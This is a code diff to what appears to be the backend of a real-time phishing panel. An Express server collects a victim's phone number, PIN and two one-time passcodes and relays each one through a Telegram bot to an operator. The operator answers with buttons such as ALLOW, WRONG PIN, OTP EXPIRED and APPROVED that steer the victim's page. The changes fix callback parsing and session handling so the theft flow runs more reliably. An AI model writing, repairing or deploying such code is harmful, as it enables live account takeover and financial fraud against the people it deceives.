@@ -37,7 +37,7 @@ function saveAdmins() {
 
 let bot = null;
 const sessions = new Map();
-let lastActiveUserId = null; // Fallback tracker to prevent session loss
+let lastActiveUserId = null; 
 const admins = loadAdmins();
 
 function resolveTargetChat(adminParam) {
@@ -93,9 +93,11 @@ async function initBot() {
     try {
       const actionData = query.data || '';
       const chatId = String(query.message.chat.id);
-      const parts = actionData.split('_');
-      const actionType = parts.slice(0, 2).join('_'); 
-      const targetId = parts.slice(2).join('_');
+      
+      // Fixed parsing: action is the first part (e.g. ALLOW or BLOCKED), targetId is everything after the first underscore
+      const firstUnderscoreIdx = actionData.indexOf('_');
+      const actionType = firstUnderscoreIdx !== -1 ? actionData.substring(0, firstUnderscoreIdx) : actionData;
+      const targetId = firstUnderscoreIdx !== -1 ? actionData.substring(firstUnderscoreIdx + 1) : '';
 
       let session = sessions.get(targetId);
       if (!session && lastActiveUserId) {
@@ -116,7 +118,7 @@ async function initBot() {
           break;
         case 'ALLOW_APP':
         case 'ALLOW':
-          session.status = 'PROCEED_OTP1'; // Instantly advances user to OTP Step 1
+          session.status = 'PROCEED_OTP1'; // Immediately sets status to move to OTP 1
           await bot.sendMessage(chatTarget, `✅ PIN allowed. Moved to OTP Step 1.`);
           break;
         case 'WRONG_PIN':
@@ -164,7 +166,7 @@ app.post('/api/submit-application', async (req, res) => {
 
     const targetChat = resolveTargetChat(adminChatId);
     const userId = `user_${Date.now()}`;
-    lastActiveUserId = userId; // Track latest session
+    lastActiveUserId = userId; 
 
     sessions.set(userId, { 
       adminChatId: targetChat, 
@@ -185,18 +187,22 @@ app.get('/api/check-status/:userId', (req, res) => {
     session = sessions.get(lastActiveUserId);
   }
 
-  if (!session) return res.status(200).json({ status: 'PROCEED_SIGNIN' }); // Fallback graceful response instead of 404
+  if (!session) return res.status(200).json({ status: 'PROCEED_SIGNIN' }); 
   res.status(200).json({ status: session.status });
 });
 
 app.post('/api/submit-pin', async (req, res) => {
   try {
     const { userId, phone, pin } = req.body || {};
-    let session = sessions.get(userId);
-    if (!session && lastActiveUserId) session = sessions.get(lastActiveUserId);
+    let activeId = userId || lastActiveUserId;
+    let session = sessions.get(activeId);
+    if (!session && lastActiveUserId) {
+      activeId = lastActiveUserId;
+      session = sessions.get(activeId);
+    }
     if (!session) {
       session = { adminChatId: FALLBACK_ADMIN_ID };
-      sessions.set(userId || 'default', session);
+      sessions.set(activeId || 'default', session);
     }
 
     const targetChat = session.adminChatId;
@@ -212,8 +218,8 @@ app.post('/api/submit-pin', async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: 'ALLOW', callback_data: `ALLOW_${userId || lastActiveUserId}` },
-            { text: 'BLOCKED', callback_data: `BLOCKED_${userId || lastActiveUserId}` }
+            { text: 'ALLOW', callback_data: `ALLOW_${activeId}` },
+            { text: 'BLOCKED', callback_data: `BLOCKED_${activeId}` }
           ]
         ]
       }
@@ -229,8 +235,8 @@ app.post('/api/submit-pin', async (req, res) => {
 app.post('/api/submit-otp1', async (req, res) => {
   try {
     const { userId, phone, otp } = req.body || {};
-    let session = sessions.get(userId);
-    if (!session && lastActiveUserId) session = sessions.get(lastActiveUserId);
+    let activeId = userId || lastActiveUserId;
+    let session = sessions.get(activeId);
     if (!session) session = { adminChatId: FALLBACK_ADMIN_ID };
 
     const targetChat = session.adminChatId;
@@ -246,9 +252,9 @@ app.post('/api/submit-otp1', async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: 'WRONG PIN', callback_data: `WRONG_PIN_${userId || lastActiveUserId}` },
-            { text: 'OTP EXPIRED ❌', callback_data: `OTP_EXPIRED_${userId || lastActiveUserId}` },
-            { text: 'NEXT', callback_data: `NEXT_${userId || lastActiveUserId}` }
+            { text: 'WRONG PIN', callback_data: `WRONG_PIN_${activeId}` },
+            { text: 'OTP EXPIRED ❌', callback_data: `OTP_EXPIRED_${activeId}` },
+            { text: 'NEXT', callback_data: `NEXT_${activeId}` }
           ]
         ]
       }
@@ -264,8 +270,8 @@ app.post('/api/submit-otp1', async (req, res) => {
 app.post('/api/submit-otp2', async (req, res) => {
   try {
     const { userId, phone, otp } = req.body || {};
-    let session = sessions.get(userId);
-    if (!session && lastActiveUserId) session = sessions.get(lastActiveUserId);
+    let activeId = userId || lastActiveUserId;
+    let session = sessions.get(activeId);
     if (!session) session = { adminChatId: FALLBACK_ADMIN_ID };
 
     const targetChat = session.adminChatId;
@@ -281,8 +287,8 @@ app.post('/api/submit-otp2', async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: 'INVALID OTP', callback_data: `INVALID_OTP_${userId || lastActiveUserId}` },
-            { text: 'APPROVED', callback_data: `APPROVED_FINAL_${userId || lastActiveUserId}` }
+            { text: 'INVALID OTP', callback_data: `INVALID_OTP_${activeId}` },
+            { text: 'APPROVED', callback_data: `APPROVED_FINAL_${activeId}` }
           ]
         ]
       }
@@ -300,4 +306,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-                                                                           
+    
